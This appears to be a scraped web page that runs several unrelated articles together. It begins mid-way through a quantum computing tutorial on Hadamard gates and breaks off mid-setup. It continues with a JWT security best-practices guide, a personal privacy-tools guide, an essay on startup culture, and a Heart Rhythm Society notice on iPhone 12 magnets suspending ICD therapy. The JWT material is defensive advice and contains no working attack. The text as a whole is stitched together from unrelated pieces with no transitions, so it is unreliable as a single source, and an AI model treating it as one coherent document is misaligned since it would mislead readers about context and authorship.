we’ve covered up until this point such as CNOT also work on qbits. These matrix operators have the effect of manipulating each of the amplitudes of a qbit without measuring and collapsing it. For example, here is a negation operator on a qbit:</p><figure><img src="https://whiteheadsoftware.dev/content/images/2020/03/1-SjlE4A5QXilso1eAfgS6EQ.png" alt=""></figure><p>Before we move on, it’s worth noting that the values of the amplitudes of <em>a</em>₀ and <em>a</em>₁ are really <a href="https://en.wikipedia.org/wiki/Complex_number" rel="noopener nofollow">complex numbers</a>, and so the state of a qbit can be more accurately represented as a 3d unit sphere, also known as a <a href="https://en.wikipedia.org/wiki/Bloch_sphere" rel="noopener nofollow">bloch sphere</a>:</p><figure><img src="https://whiteheadsoftware.dev/content/images/2020/03/1-2HWGy68dR57nY1dXiyn8LA.png" alt=""></figure><p>However for the sake of simplicity, we will be sticking to real numbers in this guide.</p><p>Now, we can start discussing some logical gates that only make sense in a quantum context.</p><hr><p>One of the most important operators is the ‘Hadamard gate’. A Hadamard gate takes a bit in a 0 or 1 state, and puts it into an exactly equal superposition, with a 50% chance of collapsing into a 1 or 0 when measured.</p><figure><img src="https://whiteheadsoftware.dev/content/images/2020/03/1-ZhwpJo5JW01bX3Vuldy8zA.png" alt=""></figure><p>Note that the bottom-right cell of the Hadamard operator is negated. This is so that the output of the operator is different depending on whether the input was a |1⟩ or a |0⟩, making the calculation reversible.</p><p>One other important aspect of a Hadamard gate is that is reversible, so it can take a qbit in an exactly equal superposition and transform it into a |0⟩ or |1⟩.</p><figure><img src="https://whiteheadsoftware.dev/content/images/2020/03/1-7xYWHN_STPLu2T1AY94l7A.png" alt=""></figure><p>This is incredibly important, as it allows us to transition out of a quantum state without measuring — and collapsing — the state of a qbit. This allows for us to structure quantum computations deterministically, rather than probabilistically.</p><p>Quantum operators containing only real numbers are their own inverse, and so we can represent an operator’s effect on a qbit as a transformation around the unit circle as a state machine as depicted:</p><figure><img src="https://whiteheadsoftware.dev/content/images/2020/03/1-SCJw8BupaY1eNEZsazcEdQ.png" alt=""></figure><p>Which means that for a qbit with a state shown in the diagram above, after performing a Hadamard operation on it, it will be transformed to the state pointed to by its corresponding arrow. Similarly, we can construct another state-machine to represent the transformations done on a qbit by a negation operator which was shown previously (also known as a Pauli-X gate, or bit-flip) as follows:</p><figure><img src="https://whiteheadsoftware.dev/content/images/2020/03/1-AyRmq5O-gu-3yr-JTfyUqg.png" alt=""></figure><p>To perform more complicated operations on our qbit, we can chain multiple operators together, or use gates multiple times. We can represent an example of a series of transformations using <a href="https://warwick.ac.uk/fac/sci/physics/research/cfsa/people/pastmembers/charemzam/pastprojects/mcharemza_quant_circ.pdf" rel="noopener nofollow">Quantum circuit notation</a> as follows:</p><figure><img src="https://whiteheadsoftware.dev/content/images/2020/03/1-lcDtxkW9SvQDXs8kcKiljA-1.png" alt=""></figure><p>This means that if we start with a |0⟩ bit, apply a bit-flip, followed by a Hadamard gate, another bit-flip, another Hadamard gate, and a final bit-flip, you end up with the resulting vector on the right of the circuit. By overlaying each state machine atop of each other, you can start at |0⟩ and follow the coloured arrows corresponding to each transformation to see how this works.</p><figure><img src="https://whiteheadsoftware.dev/content/images/2020/03/1-Fr9p2oP9Renp049KMNAAQA.png" alt=""></figure><p>As we’ve gotten this far, we can now look at the subset of a quantum algorithm known as the <a href="https://en.wikipedia.org/wiki/Deutsch%E2%80%93Jozsa_algorithm" rel="noopener nofollow">Deutsch-Jozsa algorithm</a> and demonstrate how it can clearly outperform a classical computer. One interesting note about the Deutsch-Jozsa algorithm is that it is completely deterministic, meaning that it will return the right answer 100% of the time, as opposed to many other quantum algorithms that rely on probabilistic measurements of qbits.</p><hr><p>Imagine that you were given a black box that contains a function/operator on one bit (Remember the four possible operators on a bit: Identity, negation, constant-0 and constant-1).

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            
              <p>JSON Web Tokens (JWTs) get a lot of hate online for being insecure. Tom Ptacek, founder of <a href="https://latacora.com/">Latacora</a>, a security consultancy, had this to say about <a href="https://news.ycombinator.com/item?id=14292223">JWTs in 2017</a>:</p>

<blockquote>
  <p>So, as someone who does some work in crypto engineering, arguments about JWT being problematic only if implementations are “bungled” or developers are “incompetent” are sort of an obvious “tell” that the people behind those arguments aren’t really crypto people. In crypto, this debate is over.</p>

  <p>I know a lot of crypto people who do not like JWT. I don’t know one who does.</p>
</blockquote>

<p>Despite some negative sentiment, JWTs are a powerful and secure method of managing identity and authorization – they simply need to be used properly. They have other benefits too, they’re flexible, <a href="https://tools.ietf.org/html/rfc7519">standardized</a>, stateless, portable, easy to understand, and extendable. They also have libraries to help you generate and consume them in almost every programming language.</p>

<p>This article will help make sure your JWTs are unassailable. It’ll cover how you can securely integrate tokens into your systems by illustrating the most secure options.</p>

<p>However, every situation is different. You know your data and risk factors, so please learn these best practices and then apply them using judgement. A bank shouldn’t follow the same security practices as a ‘todo’ SaaS application; take your needs into account when implementing these recommendations.</p>

<p>One additional note regarding the security of JWTs is that they are similar in many respects to other signed data, such as SAML assertions. While JWTs are often stored in a wider range of locations than SAML tokens are, it is always recommended that you carefully protect any signed tokens.</p>

<h2 id="definitions">Definitions</h2>

<ul>
  <li><strong>creator</strong>: the system which creates the JWTs. In the world of OAuth this is often called an Authorization Server or AS.</li>
  <li><strong>consumer</strong>: a system which consumes a JWT. In the world of OAuth this is often called the Resource Server or RS. These consume a JWT to determine if they should allow access to a Protected Resource such as an API.</li>
  <li><strong>client</strong>: a system which retrieves a token from the creator, holds it, and presents it to other systems like a consumer.</li>
  <li><strong>claim</strong>: a piece of information asserted about the subject of the JWT. Some are standardized, others are application specific.</li>
</ul>

<h2 id="out-of-scope">Out of scope</h2>

<p>This article will only be discussing signed JWTs. Signing of JSON data structures is <a href="https://tools.ietf.org/html/rfc7515">standardized</a>. There are also standards for <a href="https://tools.ietf.org/html/rfc7516">encrypting JSON data</a> but signed tokens are more common, so we’ll focus on them. Therefore, in this article the term JWT refers to signed tokens, not encrypted ones.</p>

<h2 id="security-considerations">Security considerations</h2>

<p>When you are working with JWTs in any capacity, be aware of the footguns that are available to you (to, you know, let you shoot yourself in the foot).</p>

<p>The first is that a signed JWT is like a postcard. Anyone who has access to it can read it. Though this may look illegible, it’s trivial to decode:</p>

<div><div><pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJmdXNpb25hdXRoLmlvIiwiZXhwIjoxNTkwNzA4Mzg1LCJhdWQiOiIyMzhkNDc5My03MGRlLTQxODMtOTcwNy00OGVkOGVjZDE5ZDkiLCJzdWIiOiIxOTAxNmI3My0zZmZhLTRiMjYtODBkOC1hYTkyODc3Mzg2NzciLCJuYW1lIjoiRGFuIE1vb3JlIiwicm9sZXMiOlsiUkVUUklFVkVfVE9ET1MiXX0.8QfosnY2ZledxWajJJqFPdEvrtQtP_Y3g5Kqk8bvHjo
</code></pre></div></div>

<p>You can decode it using <a href="https://fusionauth.io/learn/expert-advice/dev-tools/jwt-debugger">any number of online tools</a>, because it’s just three base 64 encoded strings joined by periods.</p>

<p>Keep any data that you wouldn’t want in the hands of someone else outside of your JWT. When you sign and send a token, or when you decode and receive it, you’re guaranteed the contents didn’t change. You’re not guaranteed the contents are unseen.</p>

<p>A corollary of that is that any information you do send should avoid unintentional data leakage. This would include information such as identifiers. If a JWT includes a value like <code>123</code> for an id, that means anyone viewing it has a pretty good idea that there is an entity with the id of <code>122</code>. Use a GUID or random string for identifiers instead. Likewise, because tokens are not encrypted, use TLS for transmitting them.</p>

<p>Don’t send JWTs using an HTTP method that may be cached or logged. So don’t append the token to a <code>GET</code> request as a parameter. If you must send it in a GET request, use an HTTP header. You can also use other HTTP methods such as <code>POST</code>, which sends the JWT as a part of a request body. Sending the token value as part of a <code>GET</code> URL might result in the JWT being stored in a proxy’s memory or filesystem, a browser cache, or even in web server access logs.</p>

<p>If you are using OAuth, be careful with the Implicit grant, because if not implemented correctly, it can send the JWT (the access token) as a request parameter or fragment. For example, the <a href="https://developers.docusign.com/esign-rest-api/guides/authentication/oauth2-implicit#step-1-obtain-the-access-token">Docusign esign REST API</a> delivers the access token as a URL fragment. Oops.</p>

<h2 id="creating-tokens">Creating tokens</h2>

<p>When you are creating a JWT, use a library. Don’t implement this RFC yourself. There are lots of <a href="https://openid.net/developers/jwt/">great libraries out there</a>. Use one.</p>

<p>Set the <code>typ</code> claim of your JWT header to a known value. This prevents one kind of token from being confused with one of a different type.</p>

<h3 id="signature-algorithms">Signature algorithms</h3>

<p>Choose the correct signing algorithm. You have two families of options, a symmetric algorithm like HMAC or an asymmetric choice like RSA or elliptic curve (ECC). The <code>"none"</code> algorithm, which doesn’t sign the JWT and allows anyone to generate a token with any payload they want, should not be used and any JWTs that use this signing algorithm (meaning they aren’t signed) should be rejected immediately.</p>

<p>There are two main factors in algorithm selection. The first is performance. A symmetric signing algorithm like HMAC is simply faster. Here are the benchmark results using the <code>ruby-jwt</code> library, which encoded and decoded a token 50,000 times:</p>

<div><div><pre><code>hmac encode
  4.620000   0.008000   4.628000 (  4.653274)
hmac decode
  6.100000   0.032000   6.132000 (  6.152018)
rsa encode
 42.052000   0.048000  42.100000 ( 42.216739)
rsa decode
  6.644000   0.012000   6.656000 (  6.665588)
ecc encode
 11.444000   0.004000  11.448000 ( 11.464170)
ecc decode
 12.728000   0.008000  12.736000 ( 12.751313)
</code></pre></div></div>

<p>Don’t look at the absolute numbers, they’re going to change based on the programming language, what’s happening on the system during a benchmark run, and CPU horsepower. Instead, focus on the ratios. RSA encoding took approximately 9 times as long as HMAC encoding. ECC took almost two and a half times as long to encode and twice as long to decode. The code is <a href="https://github.com/FusionAuth/fusionauth-example-ruby-jwt/blob/master/benchmark_algos.rb">available</a> if you’d like to take a look. Symmetric signatures are faster than asymmetric options.</p>

<p>However, the shared secret required for options like HMAC has security implications. The token consumer can create a JWT indistinguishable from a token built by the creator, because both have access to the algorithm and the shared secret.</p>

<p>The second factor in choosing the correct signing algorithm is secret distribution. HMAC requires a shared secret to decode and encode the token. This means you need some method to provide the secret to both the creator and consumer of the JWT. If you control both parties and they live in a common environment, this is not typically a problem; you can add the secret to whatever secrets management solution you use and have both entities pull the secret from there. However, if you want outside entities to be able to verify your tokens, choose an asymmetric option. This might happen if the consumer is operated by a different department or business. The token creator can use the <a href="https://tools.ietf.org/html/rfc7517">JWK</a> specification to publish public keys, and then the consumer of the JWT can validate it using that key.</p>

<p>By using public/private key cryptography to sign the tokens, the issue of a shared secret is bypassed. Because of this, using an asymmetric option allows a creator to provide JWTs to token consumers that are not trusted. No system lacking the private key can generate a valid token.</p>

<p>If you have a choice between RSA and elliptic curve cryptography for a public/private key signing algorithm, choose elliptic curve cryptography, as it’s easier to configure correctly, more modern, has fewer attacks, and is faster. You might have to use RSA if other parties don’t support ECC.</p>

<h3 id="claims">Claims</h3>

<p>Make sure you set your claims appropriately. The JWT specification is clear:</p>

<blockquote>
  <p>The set of claims that a JWT must contain to be considered valid is context dependent and is outside the scope of this specification.</p>
</blockquote>

<p>Therefore no claims are required by the RFC. But to maximize security, the following registered claims should be part of your token creation:</p>

<ul>
  <li><code>iss</code> identifies the issuer of the JWT. It doesn’t matter exactly what this string is as long as it is unique, doesn’t leak information about the internals of the issuer, and is known by the consumer.</li>
  <li><code>aud</code> identifies the audience of the token. This can be a scalar or an array value, but in either case it should also be known by the consumer.</li>
  <li><code>nbf</code> and <code>exp</code> claims determine the timeframe that the token is valid. The <code>nbf</code> claim can be useful if you are issuing a token for future use. The <code>exp</code> claim, a time beyond which the JWT is no longer valid, should always be set.</li>
</ul>

<h3 id="revocation">Revocation</h3>

<p>Because it is difficult to invalidate JWTs once issued–one of their benefits is that they are stateless, which means that their holders don’t need to reach out to any server to verify they are valid–you should keep their lifetime on the order of hours or minutes, rather than days or months. Short lifetimes mean that should a JWT be stolen, the stolen token will soon expire and no longer be accepted by the consumer.</p>

<p>But there are times, such as a data breach or a user logging out of your application, when you’ll want to revoke tokens, either across a system or on a more granular level. You have a few choices here. These are in order of how much effort implementation would require from the token consumer:</p>

<ul>
  <li>Let tokens expire. No effort required here.</li>
  <li>Have the creator rotate the secret or private key. This invalidates all extant tokens.</li>
  <li>Use a ‘time window’ solution in combination with webhooks. Read more about this …</li></ul></div></div>

    <h2 id="the-need-for-privacy">The need for privacy</h2>
<blockquote>
<p>Why should I care about privacy, I have nothing to hide</p>
</blockquote>
<p>Until a few years back, this question was very difficult to answer. People always perceived privacy in the physical sense. No one grasped the concept of digital privacy, let alone care about it.</p>
<p>You wouldn’t want a stranger to enter your home uninvited, right? So why treat your digital world any different. Your digital world contains private information like conversations, interactions, interests, and transactions that are worth protecting.</p>
<p><img src="https://yashmehrotra.com/images/privacy-snowden-quote.png" alt="Snowden Quote"></p>
<p>With invasive ads and all websites you visit keeping a track of you, I would say a breaking point will be reached soon. In action, it would be defined as when someone would go the inconvenient way of achieving a task to preserve their privacy.</p>
<p>The harsh truth is, <a href="https://en.wikipedia.org/wiki/Surveillance_capitalism">surveillance capitalism</a> is <a href="https://thereader.mitpress.mit.edu/tech-companies-are-profiling-us-from-before-birth/">real</a>, and it is <a href="https://qz.com/1950685/instagrams-shop-tab-shows-the-dangers-surveillance-capitalism/">rising</a>. With FAAG (Facebook, Apple, Amazon &amp; Google) either buying every company or eliminating them by copying their feature’s which remotely threaten them, they are centralizing all your data. Google recently acquired FitBit (a fitness tracker manufacturing company) only to have an <a href="https://www.theverge.com/2020/8/4/21353947/google-fitbit-acquisition-eu-investigation-antitrust-health-tracking-data">anti-trust investigation launched</a> against them with fears over Google misusing health data.</p>
<p>Fortunately, as times changed, people’s mindsets changed as well. They started realizing that the lives they live digitally have significance too. And those who still weren’t quite convinced, Facebook and Google ironically played a major role in persuading them their privacy is actually at stake by crossing the line far too many times.<img src="https://yashmehrotra.com/images/privacy-news-articles.png" alt="They just don’t care"></p>
<p>The question which arises is what can we do? Are we becoming too set in our ways or can we take back what should have always belonged to us,  our privacy.</p>
<h2 id="why-an-eventual-compromise-is-the-answer">Why an eventual compromise is the answer</h2>
<p>Going off the grid is impractical. Migrating away from an entire ecosystem is strenuous. The FAAG are here to stay.</p>
<p>An eventual compromise here means restricting yourself to use only a few services provided by those companies but only limited to that. A trade-off essentially and making your peace with it.</p>
<p>The bitter reality is that distancing yourself from these services comes at a greater cost of convenience. While there are some extremists who have taken those difficult steps, they also have to convince their friends and family as well to make the switch.</p>
<p>As much as you may disgust Facebook, you might still have to use WhatsApp because everyone else already does, it is more of a necessity now. Albeit, Signal is gaining some much deserved popularity recently, it is still miles away from WhatsApp’s market cap.</p>
<p>Ever thought of removing Google entirely from your life? It is nerve-racking.</p>
<p>This is where trade-offs and calculated risks come into place. Rather than going cold turkey on the services deeply rooted in our lives, we choose to be aware of what information do they have about us and the risks that they pose. We take a conscious call knowing how much and what kind of data are we sharing and what we are getting in exchange.</p>
<h2 id="evaluation-criteria">Evaluation criteria</h2>
<p>Everyone has a different framework when it comes to choosing the tool to use.</p>
<p>Some people value ease of use whilst others may value integrations with different software.</p>
<p>Some would value privacy over functionality, others may not.</p>
<p>Some prefer to go for self-hosted tools whereas a huge part of the population don’t even know what that means.</p>
<p>This depends on person to person and use case to use case, think one of your own.</p>
<p>While deciding, also keep in mind the privacy laws of your country (esp. Key disclosure law) and whether the service you are using is part of <a href="https://restoreprivacy.com/5-eyes-9-eyes-14-eyes/">5-9-14 eyes</a>. If you think this is too extreme, you can just skim through the Privacy Policy and see whether you are comfortable with the data they are capturing and sharing with their third-party services.</p>
<p>The <a href="https://www.privacytools.io/">privacytools.io</a> website could be your guide for this process.</p>

<p><strong>Browser: Firefox</strong></p>
<p>I use Firefox because of its simplicity, care for user’s privacy, and <a href="https://www.mozilla.org/en-US/about/manifesto/">Mozilla’s commitment to keeping the web an open platform</a>. Feature-wise, Firefox is at par with other browsers and I have found it to be less RAM hungry than Chrome.</p>
<p>Extensions:</p>
<ul>
<li><a href="https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/">Multi-account containers: </a> It lets you keep parts of your online life separated into color-coded tabs that preserve your privacy. For eg. I have containers for Personal, Work, Google, Banking, Shopping, etc. This ensures that cookies aren’t shared between those containers and is essentially equivalent to using a different browser. My goal for this year is to not see a single relevant advertisement.</li>
<li><a href="https://addons.mozilla.org/en-US/firefox/addon/ublock-origin/">uBlock Origin</a>: Block all the unwanted trackers (You can also install this on your mobile phone).</li>
<li>You can also go through this <a href="https://blog.mozilla.org/firefox/make-your-firefox-browser-a-privacy-superpower-with-these-extensions/">list of privacy enhancing extensions curated by Mozilla</a>.</li>
</ul>
<p><strong>Storage</strong></p>
<p>Since the dawn of the digital age, we have accumulated massive amount of data over the years. After all, we use multiple devices each of which have their own storage. But keep in mind that these are our private files and should be kept with a company that respects our privacy.</p>
<ul>
<li>I personally use pCloud. It is the least of all the evils (although they charge extra for zero knowledge encrypted storage).</li>
<li><a href="https://protonmail.com/blog/proton-drive-early-access/">ProtonDrive</a> is also releasing soon which seems promising.</li>
<li>If you want to self-host, Nextcloud and Syncthing are good.</li>
<li>Just do not go for Google Drive, iCloud or OneDrive.</li>
<li>Follow the 3-2-1 backup rule: At least 3 copies of your data in 2 different locations, 1 of which needs to be off-site.</li>
</ul>
<p><strong>Email</strong></p>
<ul>
<li>Slowly moving to <a href="https://protonmail.com/">ProtonMail</a> for primary mail. Privacy is their unique selling point.</li>
<li>Gmail due to legacy reasons. A lot of critical accounts and contacts still have that email.</li>
</ul>
<p><strong>Communication</strong></p>
<ul>
<li>Use Signal</li>
<li>Avoid WhatsApp, Facebook will eventually get rid of the end-to-end encryption.</li>
<li>Story Time: After selling Whatsapp to Facebook, the founder Brian Acton was assured that end-to-end encryption won’t be removed and they’ll figure other ways to monetize it. Though Facebook failed to keep their end of the deal, which ended up with Brian Acton donating $50 million USD to Open Whisper Foundation (Signal’s Parent organization).</li>
</ul>
<p><strong>Password management</strong></p>
<ul>
<li>Use a password manager. Period.</li>
<li>Use different passwords for different websites so that in case one company’s database gets breached, you wouldn’t have to worry about other websites (All the password managers have password generation functionality).</li>
<li>I personally advocate for <a href="https://bitwarden.com/">Bitwarden</a>, but <a href="https://www.lastpass.com/">Lastpass</a> and <a href="https://1password.com/">1password</a> are good too.</li>
<li>Keep in mind that your password manager will be your single point of failure so you need to make sure that the masters password is extremely strong.</li>
</ul>
<p><strong>VPN</strong></p>
<ul>
<li>Not easy to choose, they all have pro’s and con’s. Use <a href="https://privacytools.io/providers/vpn/">privacytools’s VPN page</a> to choose and also take a look at country of origin and their logging policy.</li>
<li>Tor Browser is the best for anonymous browsing but some of the websites you use may break over there.</li>
</ul>
<p><strong>Search Engine</strong></p>
<ul>
<li>I know, I know, the others are not as good as Google. But they are not all that bad. I’ve been using <a href="https://duckduckgo.com/">DuckDuckGo</a> for quite sometime and it works 95% of the time, and is improving constantly.</li>
<li>The problem with Google is not only does it scan and analyze all your searches, it has its <a href="https://www.rt.com/usa/503964-whistleblower-google-skews-results/">own biases</a> and is known for <a href="https://www.theregister.com/2020/10/21/google_search_iframe/">skewing the results</a> as <a href="https://www.ccn.com/google-manipulates-search-results-former-engineer-shockingly-confirms/">they see fit</a>.</li>
</ul>
<h2 id="behavioral-changes-you-can-make">Behavioral changes you can make</h2>
<p>When it comes to a certain behavior, our brains are hard-wired to do things subconsciously that we ourselves may not be aware of. Companies research and study this behavior, and do their best to exploit this.</p>
<p>Here are a few common things that you can start with:</p>
<ul>
<li>
<p>No need to tell EVERYONE your email</p>
<ul>
<li>Use a temporary email if you just want to check out a site that requires account creation. Services like <a href="https://temp-mail.org/">TempMail</a> can be used to get temporary emails.</li>
<li>It will help you reduce the unwanted amount of spam.</li>
</ul>
</li>
<li>
<p>Don’t share unnecessary details</p>
<ul>
<li>If a site asks for your birthday or gender, don’t give it.</li>
<li>Don’t fill out all the details of the profile page unless the functioning of the website is being effected.</li>
<li>James Jani, a YouTuber <a href="https://www.youtube.com/watch?v=uZ2l-kk5ihk">explains how this data eventually ends up being sold to the highest bidder</a>.</li>
</ul>
</li>
<li>
<p>Use incognito mode if you are just browsing and don’t want a persistent session</p>
<ul>
<li>This applies to all searches and website visits. The rule of thumb I follow is: If you have to login, use a normal window, else go incognito.</li>
<li>Incognito mode does not hide your browsing from service providers, but it makes it harder for ad networks to track you across different websites.</li>
</ul>
</li>
<li>
<p>The whole world is watching philosophy</p>
<ul>
<li>For social media sites like Instagram/Twitter/Facebook: Assume everything you post is public. It would not just be viewed by your friends or followers, everyone can see what you post.</li>
<li>This comes under the “Eventual compromise” we discussed earlier, we are aware of the negative consequences but we take a call because <del>we want to be up to date with the memes</del> these websites can have a positive effect if we use them the right way.</li>
</ul>
</li>
<li>
<p>Avoid “smart” devices</p>
<ul>
<li>Both Amazon and Google’s home devices have been caught listening to user’s when they weren’t supposed to.</li>
<li><a href="https://www.theguardian.com/technology/2019/oct/09/alexa-are-you-invading-my-privacy-the-dark-side-of-our-voice-assistants">Amazon’s echo apparently sent their owner’s recordings to someone else without their permission or knowledge</a> and <a href="https://www.cnbc.com/2019/07/11/google-admits-leaked-private-voice-conversations.html">Google just doesn’t care enough once they acquire the data</a>.</li>
</ul>
</li>
<li>
<p>Review your phone’s app permissions</p>
<ul>
<li>Mobile apps would try their hardest to get as many data points as they can which often includes sending &amp; connecting to trackers automatically in the background.</li>
<li>Be aware of which apps have critical permissions like location, microphone &amp; camera.</li>
<li>Android and iOS did introduce the “Allow permission just for now” functionality to curb this.</li>
</ul>
</li>
</ul>

<!--more-->
<p>A quick story to set the stage: About six years ago I scaled my company from 15-employees to 75-employees in about nine months, which was one of the most painful experiences of my business life. Our corporate culture, previously a strong suit of the business, was completely unprepared for the stresses of that type of rapid scale-up, and the growth almost killed my company.</p>
<p>Then we did the incredibly challenging work of transforming our culture from the inside out, while still hitting milestones of a venture-backed, high-growth company. With the support of a ton of dedicated people, we did it, and the company is now back on track to (fingers crossed) win the market.</p>
<p>All this to say that, having nearly ruined my company due to underinvesting in culture at a critical time, and having done the hard work of fixing and rebuilding our culture to become a strength once again, I have a unique appreciation for the importance, and delicacy, of corporate culture.</p>
<div><p>Here's the first thing I discuss with entrepreneurs as they start to work consciously on their culture:</p></div>
<h3>Why most “culture work” actually hurts your company, and what to do about it</h3>
<blockquote>
<p>“Culture eats strategy for lunch” — Peter Drucker</p>
</blockquote>
<p>This is one of the most popular quotes on corporate culture. And it’s true. The best company cultures are the foundation on which successful strategy after successful strategy are built.</p>
<p>So everyone should hire people to focus on culture, point them in the right direction, and get out of their way. Right?</p>
<p>Wrong.</p>
<p>According to Fred Kofman, author of Conscious Business and culture consultant to hundreds of organizations, the vast majority of culture work does more harm than good. As in, not only doesn’t it improve the culture, most culture work actually harms the culture it’s trying to help. America spends billions on corporate culture each year, and the sad reality is that, on average, companies would be better off simply crossing their fingers.</p>
<p>But why? Why does most of the effort put toward the most powerful lever in business backfire? Perhaps even more importantly, how can you ensure that the work you put into building your culture intentionally is among the small percentage that eats strategy for lunch?</p>

<p><strong>Start with discovery, not Generation</strong></p>
<p>Ask ten CEOs what makes a good company culture, and they’ll all say something similar: Trust, freedom, autonomy, mastery, purpose, ping pong tables... For many leaders, when they set to work thinking about company culture their first instinct is to simply brainstorm (generate) the culture they want, usually some version of the above, and then figure out the quickest way to communicate those values to their team.</p>
<p><strong>This is the single most common way to disillusion your team and hurt your culture with the best of intentions. Because culture work must start with discovery, not generation.</strong></p>
<blockquote>
<p>There’s no way to open the future without closing the past. Unless the company’s leadership does a serious examination of their previous disengaging behaviors, and convinces the workforce that they are committed to change that behavior in a serious way, any engagement program is dead on arrival. — Fred Kofman</p>
</blockquote>
<p>The reality is that even if you’ve never thought about it, <span>your company already has a well-engrained culture with very specific characteristics, all of which your employees know well even if you do not (and if you think you do, but you haven’t asked employees to confirm, don’t be so sure)</span>. As a result, any values or mission you put on the wall, if they don’t match the actual, existing culture already present, they will communicate to your team you are clueless and, slowly or quickly, they’ll begin to check out. It’s as if your parents, after consistently missing your soccer games for partner calls,&nbsp;call a family meeting to say their core family value is “togetherness.”</p>
<p>Effective culture change work, the kind that changes an entire company rather than simply making an executive team feel progressive, begins with a deep discovery process. It asks the question: <strong>what is our existing culture now? What are our current values, whether or not we actually took the time to create them intentionally?</strong></p>
<p>Your parents first have to admit to their demonstrated value of “work&gt;family” and convince you they’re going to change, before you’ll hear the word “togetherness” without dripping cynicism. Similarly, <strong>you have to first discover, cop to, and clean up any messes resulting from your existing culture before you have the ability to change it.</strong></p>

<h3><strong>So how do we do this? Where do we look?</strong></h3>
<p>I know of two places to look. One is hard for one reason, and one is hard for another.</p>
<h3>1. Look inside your company</h3>
<p>Anonymous surveys are a great tool to understand how your culture is viewed by your employees. Anonymity is key, lest you get a bunch of sunshine blown up your butt. We built our own survey based on specific questions we had at my previous company, but a<span>&nbsp;</span><a href="https://www.google.com/search?q=culture+surveys&amp;rlz=1C5CHFA_enUS840US840&amp;oq=culture+surveys&amp;aqs=chrome..69i57j0j0i22i30j0i22i30i395l7.2476j1j4&amp;sourceid=chrome&amp;ie=UTF-8" rel="noopener" target="_blank">quick google search</a><span>&nbsp;</span>will give you many more options to choose from.</p>
<p>There is risk to this approach, however. A survey like this communicates to your employees that you understand the importance of culture, and that you will presumably listen to what they say and attempt to address it. If you take this route and do nothing to address the feedback afterward, it can cause the kind of harm we discussed above. This is a genie that is difficult to put back into the bottle.</p>
<br>
<h3>2. Look inside yourself</h3>
<p>At some point in every entrepreneur’s journey they realize that their company is simply a manifestation of their personality. The good and the bad. No matter what’s on the walls, the behavior of the leader dictates the culture. This presents a shortcut, in that you can understand your corporate culture by understanding yourself.</p>
<p>Are you late to meetings? That’s your culture. Others are late, too. Do you hold yourself to the grindstone, sacrificing holidays to make more progress? That’s your culture. Others do that, too. Do you pass the buck and blame others when things go wrong? You get the picture.</p>
<p>While most entrepreneurs resist the hell out of this (it’s scary considering your foundational role in creating the problem you see in everyone else), in my experience looking internally is the most reliable route to determine your culture. For those brave few, it’s best done with either a 360-degree survey, allowing you to get feedback from all your colleagues, or a dedicated coach to help you see your blindspots.</p>

<p><strong>I’ve reconciled with my current culture. Now what?</strong></p>
<p>No matter which discovery route you take, how you get to an understanding of your current state of affairs, the process of changing a corporate culture without hurting the business is always the same:</p>
<blockquote>
<p><strong>Step 1:</strong> Change yourself such that you live the values by which you want the company to live.</p>
<p><strong>Step 2:</strong> Write the values by which you live on the wall.</p>
</blockquote>
<p>And if you’re wondering, yes that’s what we did to transform our culture at speed.</p>
<p>1. We looked in the mirror as a leadership team (me especially)</p>
<p>2. We talked openly about the pimples we saw there</p>
<p>3. We made commitments to act differently</p>
<p>4. We acted differently</p>
<p>5. Our culture changed</p>

<p>Nobody said it was easy.</p>

<p>The Heart Rhythm Society has issued the following information regarding the use of the new iPhone 12 Series and ICDs.</p>
<p>“Implantable Cardioverter Defibrillator (ICD) remains the cornerstone therapy in the management of malignant ventricular arrythmia’s for patients with high risk cardiac conditions. An ICD system contains a battery, capacitors, sensing/ pacing circuit together with an intra-or extra-cardiac lead. All ICD’s have an in-built switch (Reed switch, Hall-effect sensors, Giant magneto sensitive resistors or coils) which respond to an externally applied magnetic field. When an external magnet is applied to a defibrillator, high voltage shock therapy for ventricular tachycardia and ventricular fibrillation is suspended. It has been estimated that a magnetic field stronger than 10 Gauss is strong enough to activate these switches.</p>
<p>Recently, Apple Inc. launched the iPhone 12 series which has a circular array of magnets around a central charging coil for the phone to be compatible with “MagSafe” accessories. MagSafe technology contains a magnetometer and single coil Near Field Communications (NFC) reader. The magnets aids in properly aligning the iPhone on a wireless charger and other peripheral accessories and increases wireless charging speeds (up to 15 Watts). The first author (JG) raised the concerns for possible device-device interaction due to presence of a strong magnetic array in the iPhone and MagSafe compatible cases. We thus tested this interaction on a patient with a Medtronic Inc. (Minneapolis, MN, USA) ICD. Institutional Review Board approved the study. Once the iPhone was brought close to the ICD over the left chest area, immediate suspension of ICD therapies was noted which persisted for the duration of the test. This was reproduced multiple times with different positions of the phone over the pocket.</p>
<p>We hereby bring an important public health issue concerning the newer generation iPhone 12 which can potentially inhibit lifesaving therapy in a patient particularly while carrying the phone in upper pockets. Contemporary studies have shown minimal risk of electromagnetic interference with ICDs and prior smartphones without magnetic arrays. A recent case report highlighted magnetic interference with a fitness tracker wrist band deactivating an ICD up to distances of 2.4 cm. Apple Inc. website does mention magnetic interference with medical devices and prior consulting with physician and medical device manufacturers. Medical device manufacturers and implanting physicians should remain vigilant in making patients aware of this significant interaction of the iPhone 12 and other smart wearables with their cardiac implantable electronic devices”.</p>
</div><div><h3><strong>If you have an interesting case, ECG or EGM please consider submitting a report. It’s a great opportunity to show CPD and share experiences for others to learn from.</strong></h3>
<p>Submissions should include a brief case background, a question with multiple choice possible answers, the answer, an explanation, a brief discussion section if relevant and a minimum of one reference and be sent to <a href="mailto:admin@bhrs.com" target="_blank" rel="noopener noreferrer">admin@bhrs.com</a> with the subject heading ‘BHRS Challenge Feature’</p>
<p>As part of our ongoing collaboration with Radcliffe Cardiology we are planning to co-publish successful submissions on the BHRS website and on a new case-based web platform, led by Professor Angelo Auricchio and the Radcliffe Group called the <a href="https://arrhythmiaacademy.com/" target="_blank" rel="noopener noreferrer">Arrhythmia Academy</a></p>
<p>As an incentive to submit cases the editor in chief of Arrhythmia and Electrophysiology Review (AER) journal, Dr Demosthenes Katritsis would like to select a ‘winning case’ each quarter and invite the author of these best cases to write a review or an expert opinion piece on the topic addressed, that would be published in the AER journal and indexed on PubMed.</p>

